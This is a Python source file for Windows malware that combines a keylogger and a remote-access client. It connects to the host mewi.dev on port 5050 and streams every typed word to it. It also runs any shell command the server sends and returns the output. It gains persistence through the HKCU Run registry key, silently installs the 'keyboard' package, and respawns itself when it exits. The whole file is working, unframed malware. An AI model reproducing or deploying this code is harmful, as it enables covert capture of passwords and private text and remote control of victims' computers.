import atexit
import datetime
import socket
import string
import subprocess
import sys
import threading
import winreg


class Client:
    def __init__(self, host: str, port: int, *, header_length: int = 16, message_encoding: str = "utf-8",
                 stop_message: str = "stop", debug: bool = False):
        self.host = host
        self.port = port
        self.server_address = (host, port)
        self.header_length = header_length
        self.message_encoding = message_encoding
        self.stop_message = stop_message
        self.debug = debug

        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.identity = subprocess.check_output(["whoami"], shell=True, encoding=self.message_encoding).strip().replace(
            "\\", "_")
        self.stop = False

    def debug_message(self, status_type, message, end: str = "\n"):
        status_type = str(status_type)
        message = str(message)

        if self.debug:
            color = "\u001b[31m"
            end_color = "\u001b[0m"
            if status_type not in ["WARNING", "ERROR"]:
                color = "\u001b[32m"
            elif status_type == "WARNING":
                color = "\u001b[33m"

            print(f"{color}[{datetime.datetime.now()}] [{status_type}]{end_color} {message}", end=end)

    def send_message(self, message: str):
        encoded_message = message.encode(self.message_encoding)
        header = str(len(encoded_message)).encode(self.message_encoding)
        header += b" " * (self.header_length - len(header))

        self.client.send(header)
        self.client.send(encoded_message)

    def receive_message(self, connection: socket.socket):
        header = connection.recv(self.header_length).decode(self.message_encoding)
        if not header:
            return
        message = connection.recv(int(header)).decode(self.message_encoding)
        return message

    def key_logger(self):
        self.debug_message("KEYLOGGER", "Keylogger started")
        while True:
            word = []
            word_processed = []
            pointer = 0

            while True:
                keyboard_event = keyboard.read_event()
                if keyboard_event.event_type == "up":
                    continue

                key = keyboard_event.name

                if key in ["space", "enter"]:
                    prefix = "_" if key == "space" else "↴"
                    self.send_message(f"r{prefix} {''.join(word)}")
                    self.send_message(f"p{prefix} {''.join(word_processed)}")
                    self.debug_message("KEYLOGGER",
                                       f"Sent  {''.join(word_processed)}  and raw information to {self.host}:{self.port}")
                    break

                key_substitution_map = {"uppil": "↑",
                                        "högerpil": "→",
                                        "nedpil": "↓",
                                        "vänsterpil": "←",
                                        "backspace": "⇤",
                                        "tab": "↹",
                                        "skift": "⇧",
                                        "right shift": "⇧",
                                        "caps lock": "⇪"}

                if key in key_substitution_map:
                    key = key_substitution_map[key]

                if len(key) > 1:
                    word.append(f"|{key}|")
                else:
                    word.append(key)

                if key == "→":
                    pointer = min(len(word_processed) - 1, pointer + 1)
                    continue

                if key == "←":
                    pointer = max(0, pointer - 1)
                    continue

                if key == "⇤":
                    if not len(word_processed):
                        continue
                    word_processed.pop(pointer)
                    pointer = max(0, pointer - 1)
                    continue

                if key not in string.printable:
                    continue

                if pointer == len(word_processed) - 1:
                    word_processed.append(key)
                else:
                    word_processed.insert(pointer + bool(pointer), key)

                pointer = min(len(word_processed) - 1, pointer + 1)

    def parse_command(self, command):
        self.debug_message("SERVER COMMAND", f"{self.host}:{self.port} issued {command}")

        command = command.split()
        instruction = command[0]
        try:
            arguments = command[1:]
        except IndexError:
            arguments = []

        if instruction == self.stop_message:
            self.disconnect()

        if instruction == "command":
            self.debug_message("EXECUTING", f"Executing: {' '.join(arguments)}")
            try:
                response = subprocess.check_output(arguments, shell=True, encoding=self.message_encoding,
                                                   errors="ignore")
                self.send_message(response)
                self.debug_message("COMMAND OUTPUT", f"{response}")
                self.debug_message("SENDING OUTPUT", f"Sending command output to {self.host}:{self.port}")
            except subprocess.CalledProcessError:
                self.debug_message("WARNING", "Command error")

    def start(self):
        self.debug_message("STARTING", "Starting client...")
        self.debug_message("CONNECTING", f"Attempting connection to {':'.join(map(str, self.server_address))}...")
        self.client.connect(self.server_address)
        self.debug_message("CONNECTED", f"Connected to {':'.join(map(str, self.server_address))}")
        self.send_message(self.identity)

        td_key_logger = threading.Thread(target=self.key_logger, daemon=True)
        td_key_logger.start()

        while not self.stop:
            try:
                self.parse_command(self.receive_message(self.client))
            except OSError:
                self.debug_message("WARNING", "Server socket is closed. Proceeding to disconnect")
                self.disconnect()

    def disconnect(self):
        try:
            self.send_message(self.stop_message)
            self.debug_message("SENT STOP MESSAGE", f"Sent client stop message to {self.host}:{self.port}")
        except OSError:
            self.debug_message("WARNING", f"Failed to send stop_message")

        self.debug_message("DISCONNECTED", f"Disconnected from {self.host}:{self.port}")
        self.debug_message("STOPPING", "Stopping client...")
        self.stop = True


class WindowsRegistryEditor:
    @staticmethod
    def enum_key(key: int):
        sub_keys = []
        try:
            i = 1
            while True:
                sub_keys.append(winreg.EnumKey(key, i))
                i += 1
        except OSError:
            return sub_keys

    @staticmethod
    def enum_value(key: int, sub_key: str):
        with winreg.OpenKey(key, sub_key, 0, winreg.KEY_READ) as open_key:
            values = []
            try:
                i = 1
                while True:
                    values.append(winreg.EnumValue(open_key, i))
                    i += 1
            except OSError:
                return values

    @classmethod
    def value_exists(cls, key: int, sub_key: str, value_name: str):
        for value in cls.enum_value(key, sub_key):
            if value[0] == value_name:
                return True
        return False

    @classmethod
    def add_value(cls, key: int, sub_key: str, value_name: str, value: str):
        if cls.value_exists(key, sub_key, value_name):
            return

        with winreg.OpenKey(key, sub_key, 0, winreg.KEY_ALL_ACCESS) as open_key:
            winreg.SetValueEx(open_key, value_name, 0, winreg.REG_SZ, value)

    @classmethod
    def edit_value(cls, key: int, sub_key: str, value_name: str, value: str):
        if not cls.value_exists(key, sub_key, value_name):
            raise Exception(f"{value_name=} does not exist at {key=} {sub_key=}")

        with winreg.OpenKey(key, sub_key, 0, winreg.KEY_ALL_ACCESS) as open_key:
            winreg.SetValueEx(open_key, value_name, 0, winreg.REG_SZ, value)

    @classmethod
    def remove_value(cls, key: int, sub_key: str, value_name: str):
        if not cls.value_exists(key, sub_key, value_name):
            return

        with winreg.OpenKey(key, sub_key, 0, winreg.KEY_ALL_ACCESS) as open_key:
            winreg.DeleteValue(open_key, value_name)


class PackageManager:
    @staticmethod
    def package_is_installed(package: str):
        return package in subprocess.check_output(["pip", "list"], shell=True, encoding="utf-8", errors="ignore")

    @classmethod
    def install_package(cls, package: str):
        if cls.package_is_installed(package):
            return

        try:
            subprocess.Popen(["pip", "install", package], shell=True)
        except subprocess.CalledProcessError:
            raise Exception(f"{package=} does not exist")

    @classmethod
    def uninstall_package(cls, package: str):
        if not cls.package_is_installed(package):
            return

        try:
            subprocess.Popen(["pip", "uninstall", package, "-y"], shell=True)
        except subprocess.CalledProcessError:
            raise Exception(f"{package=} does not exist")


@atexit.register
def disconnect():
    client.disconnect()
    client.debug_message("RESPAWNING", "Respawning client script")
    subprocess.Popen([sys.executable, file_path], shell=True)


if __name__ == "__main__":
    file_path = __file__
    WindowsRegistryEditor.add_value(winreg.HKEY_CURRENT_USER,
                                    r"Software\Microsoft\Windows\CurrentVersion\Run",
                                    "client.py",
                                    rf'"{sys.executable}" "{file_path}"')
    PackageManager.install_package("keyboard")
    import keyboard

    client = Client("mewi.dev", 5050, debug=True)
    client.start()
